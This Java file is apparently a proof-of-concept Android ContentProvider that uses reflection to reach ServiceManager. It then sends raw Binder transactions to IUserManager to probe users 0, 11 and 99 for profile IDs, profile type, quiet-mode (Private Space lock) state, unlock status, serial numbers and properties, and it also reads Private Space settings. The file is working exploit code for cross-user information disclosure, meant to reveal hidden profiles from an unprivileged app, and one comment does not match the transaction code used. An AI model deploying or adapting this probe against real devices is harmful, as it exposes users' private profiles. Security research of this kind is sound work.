package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class HighImpactProbeProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});
        cursor.addRow(new Object[]{"pid", String.valueOf(android.os.Process.myPid())});

        IBinder userBinder = svc("user");
        if (userBinder == null) {
            cursor.addRow(new Object[]{"ERROR", "cannot get user service"});
            return cursor;
        }
        String ud = "android.os.IUserManager";

        // === 1. getProfileIds (TX=25): discover all users in profile group ===
        cursor.addRow(new Object[]{"=== getProfileIds(0, false) TX=25 ===", ""});
        String profileIds = callGetProfileIds(userBinder, ud, 0, false);
        cursor.addRow(new Object[]{"profileIds_u0", profileIds});

        // === 2. getProfileType (TX=75): reveal exact user type ===
        cursor.addRow(new Object[]{"=== getProfileType TX=75 ===", ""});
        for (int userId : new int[]{0, 11, 99}) {
            String type = callGetProfileType(userBinder, ud, userId);
            cursor.addRow(new Object[]{"profileType_u" + userId, type});
        }

        // === 3. isQuietModeEnabled (TX=66): check if Private Space is locked ===
        cursor.addRow(new Object[]{"=== isQuietModeEnabled TX=66 ===", ""});
        for (int userId : new int[]{0, 11, 99}) {
            String result = callBoolTx(userBinder, ud, 66, userId);
            cursor.addRow(new Object[]{"quietMode_u" + userId, result});
        }

        // === 4. isUserRunning (TX=92): check if user is running ===
        cursor.addRow(new Object[]{"=== isUserRunning TX=92 ===", ""});
        for (int userId : new int[]{0, 11, 99}) {
            String result = callBoolTx(userBinder, ud, 92, userId);
            cursor.addRow(new Object[]{"running_u" + userId, result});
        }

        // === 5. isUserUnlocked (TX=91): check unlock state ===
        cursor.addRow(new Object[]{"=== isUserUnlocked TX=91 ===", ""});
        for (int userId : new int[]{0, 11, 99}) {
            String result = callBoolTx(userBinder, ud, 91, userId);
            cursor.addRow(new Object[]{"unlocked_u" + userId, result});
        }

        // === 6. getUserSerialNumber (TX=47): get serial number ===
        cursor.addRow(new Object[]{"=== getUserSerialNumber TX=47 ===", ""});
        for (int userId : new int[]{0, 11, 99}) {
            String result = callIntTx(userBinder, ud, 47, userId);
            cursor.addRow(new Object[]{"serial_u" + userId, result});
        }

        // === 7. hasBadge (TX=88): check if profile has badge ===
        cursor.addRow(new Object[]{"=== hasBadge TX=88 ===", ""});
        for (int userId : new int[]{0, 11, 99}) {
            String result = callBoolTx(userBinder, ud, 88, userId);
            cursor.addRow(new Object[]{"badge_u" + userId, result});
        }

        // === 8. getUserPropertiesCopy (TX=37): get profile properties ===
        cursor.addRow(new Object[]{"=== getUserPropertiesCopy TX=37 ===", ""});
        for (int userId : new int[]{0, 11, 99}) {
            String result = callPropertiesTx(userBinder, ud, userId);
            cursor.addRow(new Object[]{"props_u" + userId, result});
        }

        // === 9. isUserUnlockingOrUnlocked (TX=80): unlock transition state ===
        cursor.addRow(new Object[]{"=== isUserUnlockingOrUnlocked TX=80 ===", ""});
        for (int userId : new int[]{0, 11, 99}) {
            String result = callBoolTx(userBinder, ud, 80, userId);
            cursor.addRow(new Object[]{"unlocking_u" + userId, result});
        }

        // === 10. getProfileIdsExcludingHidden (TX=107): compare with getProfileIds ===
        cursor.addRow(new Object[]{"=== getProfileIdsExcludingHidden TX=107 ===", ""});
        String hiddenExcluded = callGetProfileIdsExcludingHidden(userBinder, ud, 0);
        cursor.addRow(new Object[]{"profileIdsExclHidden_u0", hiddenExcluded});

        // === 11. getCredentialOwnerProfile (TX=1): ===
        cursor.addRow(new Object[]{"=== getCredentialOwnerProfile TX=1 ===", ""});
        for (int userId : new int[]{0, 11, 99}) {
            String result = callIntTx(userBinder, ud, 1, userId);
            cursor.addRow(new Object[]{"credOwner_u" + userId, result});
        }

        // === 12. getProfileParentId (TX=2): ===
        cursor.addRow(new Object[]{"=== getProfileParentId TX=2 ===", ""});
        for (int userId : new int[]{0, 11, 99}) {
            String result = callIntTx(userBinder, ud, 2, userId);
            cursor.addRow(new Object[]{"parentId_u" + userId, result});
        }

        // === 13. Settings.Secure Private Space settings (no permission needed) ===
        cursor.addRow(new Object[]{"=== Settings.Secure PS config ===", ""});
        android.content.ContentResolver cr = getContext().getContentResolver();
        String[] psKeys = {
            "private_space_auto_lock",
            "hide_privatespace_entry_point",
            "lock_screen_allow_private_notifications"
        };
        for (String key : psKeys) {
            try {
                String val = android.provider.Settings.Secure.getString(cr, key);
                cursor.addRow(new Object[]{"settings_" + key, val != null ? val : "(null)"});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"settings_" + key, "BLOCKED:" + trunc(e.getMessage())});
            }
        }

        // === 14. getUserCreationTime (TX=? — try 76): user 11 creation time ===
        cursor.addRow(new Object[]{"=== getUserCreationTime ===", ""});
        for (int userId : new int[]{0, 11, 99}) {
            String result = callLongTx(userBinder, ud, 40, userId);
            cursor.addRow(new Object[]{"createTime_u" + userId, result});
        }

        return cursor;
    }

    private String callGetProfileIds(IBinder b, String d, int userId, boolean excludeDying) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(d);
            data.writeInt(userId);
            data.writeInt(excludeDying ? 1 : 0);
            b.transact(25, data, reply, 0);
            reply.readException();
            int count = reply.readInt();
            StringBuilder sb = new StringBuilder("[");
            for (int i = 0; i < count; i++) {
                if (i > 0) sb.append(",");
                sb.append(reply.readInt());
            }
            sb.append("]");
            return sb.toString();
        } catch (SecurityException e) {
            return "SEC:" + trunc(e.getMessage());
        } catch (Exception e) {
            return "ERR:" + trunc(e.getMessage());
        } finally { data.recycle(); reply.recycle(); }
    }

    private String callGetProfileIdsExcludingHidden(IBinder b, String d, int userId) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(d);
            data.writeInt(userId);
            data.writeInt(1); // enabledOnly
            b.transact(107, data, reply, 0);
            reply.readException();
            int count = reply.readInt();
            StringBuilder sb = new StringBuilder("[");
            for (int i = 0; i < count; i++) {
                if (i > 0) sb.append(",");
                sb.append(reply.readInt());
            }
            sb.append("]");
            return sb.toString();
        } catch (SecurityException e) {
            return "SEC:" + trunc(e.getMessage());
        } catch (Exception e) {
            return "ERR:" + trunc(e.getMessage());
        } finally { data.recycle(); reply.recycle(); }
    }

    private String callGetProfileType(IBinder b, String d, int userId) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(d);
            data.writeInt(userId);
            b.transact(75, data, reply, 0);
            reply.readException();
            return reply.readString();
        } catch (SecurityException e) {
            return "SEC:" + trunc(e.getMessage());
        } catch (Exception e) {
            return "ERR:" + trunc(e.getMessage());
        } finally { data.recycle(); reply.recycle(); }
    }

    private String callBoolTx(IBinder b, String d, int tx, int userId) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(d);
            data.writeInt(userId);
            b.transact(tx, data, reply, 0);
            reply.readException();
            return reply.readInt() != 0 ? "true" : "false";
        } catch (SecurityException e) {
            return "SEC:" + trunc(e.getMessage());
        } catch (Exception e) {
            return "ERR:" + trunc(e.getMessage());
        } finally { data.recycle(); reply.recycle(); }
    }

    private String callLongTx(IBinder b, String d, int tx, int userId) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(d);
            data.writeInt(userId);
            b.transact(tx, data, reply, 0);
            reply.readException();
            return String.valueOf(reply.readLong());
        } catch (SecurityException e) {
            return "SEC:" + trunc(e.getMessage());
        } catch (Exception e) {
            return "ERR:" + trunc(e.getMessage());
        } finally { data.recycle(); reply.recycle(); }
    }

    private String callIntTx(IBinder b, String d, int tx, int userId) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(d);
            data.writeInt(userId);
            b.transact(tx, data, reply, 0);
            reply.readException();
            return String.valueOf(reply.readInt());
        } catch (SecurityException e) {
            return "SEC:" + trunc(e.getMessage());
        } catch (Exception e) {
            return "ERR:" + trunc(e.getMessage());
        } finally { data.recycle(); reply.recycle(); }
    }

    private String callPropertiesTx(IBinder b, String d, int userId) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(d);
            data.writeInt(userId);
            b.transact(37, data, reply, 0);
            reply.readException();
            int avail = reply.dataAvail();
            if (avail > 0) {
                int present = reply.readInt();
                StringBuilder sb = new StringBuilder("present=0x" + Integer.toHexString(present));
                sb.append(" avail=" + avail);
                if (avail >= 8) {
                    int showInLauncher = reply.readInt();
                    sb.append(" showInLauncher=" + showInLauncher);
                }
                if (avail >= 12) {
                    int showInSettings = reply.readInt();
                    sb.append(" showInSettings=" + showInSettings);
                }
                return sb.toString();
            }
            return "empty";
        } catch (SecurityException e) {
            return "SEC:" + trunc(e.getMessage());
        } catch (Exception e) {
            return "ERR:" + trunc(e.getMessage());
        } finally { data.recycle(); reply.recycle(); }
    }

    private String trunc(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder svc(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
